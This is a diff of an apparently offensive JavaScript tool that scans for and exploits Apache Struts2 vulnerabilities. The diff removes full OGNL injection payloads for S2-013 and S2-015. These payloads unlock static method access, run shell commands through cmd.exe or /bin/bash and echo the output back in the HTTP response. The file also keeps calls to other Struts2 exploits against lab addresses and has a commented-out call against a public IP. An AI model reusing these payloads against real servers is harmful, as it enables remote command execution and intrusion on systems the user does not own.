@@ -577,122 +577,6 @@ function doStruts2_009(url, fnCbk)
 	  );
 }
 
-/*
-Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，
-get 或 all，参考官方其对应意义如下：
-none - 链接不包含请求的任意参数值（默认）
-get - 链接只包含 GET 请求中的参数和其值
-all - 链接包含 GET 和 POST 所有参数和其值
-<s:a>用来显示一个超链接，当includeParams=all的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。
-   在放置参数的过程中会将参数进行OGNL渲染，造成任意命令执行漏洞。
-*/
-function doStruts2_013(url, fnCbk)
-{
-	// encodeURIComponent(g_postData)
-	var s = "%{#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
-	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
-	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
-	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
-	+ ",#as=new java.lang.String()"
-	+ ",#p.redirectErrorStream(true),#process=#p.start()"
-	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()"
-	+ ",#f.println(#as)"
-	+ ",#f.flush()"
-	+ ",#f.close()"
-	+"}";
-	this.name = this.name || "a";
-	request(fnOptHeader({method: 'GET',uri: url + "?" + this.name + "=" + encodeURIComponent(s)
-	    })
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-013,s2-014",url);
-	  		}
-	    }
-	  );
-	request(fnOptHeader({method: 'POST',uri: url,
-		"formData":{"xt": s}
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-013,s2-014",url);
-	  		}
-	    }
-	  );
-}
-
-/*
-/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}.action
-*/
-function doStruts2_015(url, fnCbk)
-{
-	var fnC = function(szCmd,fnCbk1)
-	{
-		var s = "${#context['xwork.MethodAccessor.denyMethodExecution']=false"
-		//////// 增加的关键行 start//////
-		+ ",#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')"
-		+ ",#f.setAccessible(true)"
-		+ ",#f.set(#_memberAccess,true)"
-		//////// 增加的关键行 end//////
-		// + ",#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))"
-		// + ',#cmds=(#iswin?{"cmd.exe","/c","' + g_szCmdW + '"}:{"/bin/bash","-c","' + g_szCmd + '"})'
-		+ ",#p=new java.lang.ProcessBuilder('"+szCmd+"')"
-		+ ",#as=new java.lang.String()"
-		+ ",#p.redirectErrorStream(true),#process=#p.start()"
-		+ ",#c=new java.io.InputStreamReader(#process.getInputStream()),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-		+ ",#i=#d.read(#e),#as=#as+new java.lang.String(#e,0,#i)" 
-		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		// + ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",#as='{{'+#as+'}}'"
-		+ ",#as.toString()"
-		+"}";
-		request(fnOptHeader({method: 'GET',uri: url + encodeURIComponent(s) + ".do"
-		    })
-		  , function (error, response, body){
-		  	// console.log(error||body);
-		  		if(body)
-		  		{
-		  			var r = /\{\{([^\}]+)\}\}/gmi.exec(body),sR = r && r[1] || "";
-		  			fnCbk1(sR.replace(/(^\s*)|(\s*$)/gmi,''));
-		  			// fnDoBody(body,"s2-015",url);
-		  		}else fnCbk1('');
-		    }
-		  );
-	};
-	var a = g_szCmd.split(";"),aR = [],nC = 0;
-	for(var i = 0; i < a.length; i++)
-	{
-		if(-1 < a[i].indexOf("echo")){nC++;continue;}
-		(function(n)
-		{
-			fnC(a[n],function(s)
-			{
-				console.log(s);
-				aR[n] = s;
-				nC++;
-			})
-		})(i);
-	}
-	var nT = setInterval(function()
-	{
-		if(nC == a.length)
-		{
-			clearInterval(nT);
-			// console.log("kkkk:" +aR.join('') + "kkk");
-			fnDoBody(aR.join("\n"),"s2-015",url);
-		}
-	},13);
-}
-
 // /robots.txt
 /*
  "action:", "redirect:", "redirectAction:" 
@@ -996,7 +880,7 @@ function fnMyPut(url)
 // https://github.com/Medicean/VulApps/tree/master/s/struts2
 function fnTestStruts2(szUrl2, obj)
 {
-	var a = [doStruts2_009,doStruts2_013,doStruts2_029,doStruts2_053], fnGetCpy = function()
+	var a = [doStruts2_009,doStruts2_029,doStruts2_053], fnGetCpy = function()
 	{
 		var o = {name:null};
 		if(!obj)return o;
@@ -1094,7 +978,7 @@ if(program.test)
 	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
  	// doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	doStruts2_032.call({name:null},"http://192.168.10.216:8088/s2-032/memoindex.action");
-	doStruts2_015.call({name:null},"http://101.89.63.203:2001/jnrst/");
+	// doStruts2_015.call({name:null},"http://101.89.63.203:2001/jnrst/");
 	/////////////*/
 	/**
 	doStruts2_009(g_szUrl);
@@ -1113,7 +997,7 @@ if(program.test)
 	// doStruts2_007.call({name:null},"http://192.168.10.216:8088/S2-007/user.action");
 	// doStruts2_012.call({name:null},"http://192.168.10.216:8088/S2-012/user.action");
 	doStruts2_013.call({name:null},"http://192.168.10.216:8088/S2-013/link.action");
-	doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
+	// doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
 	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
 	doStruts2_019.call({name:null},"http://192.168.10.216:8088/S2-019/example/HelloWorld.action");
 	doStruts2_029.call({name:null},"http://192.168.10.216:8088/S2-029/default.action");
@@ -1124,6 +1008,7 @@ if(program.test)
 	doStruts2_053.call({name:null},"http://192.168.10.216:8082/s2-053/");
 	///////////*/
 }
+
 /*
 var a = fs.readFileSync("./nwTomcat.txt").toString().trim().split("\n");
 for(var k in a)
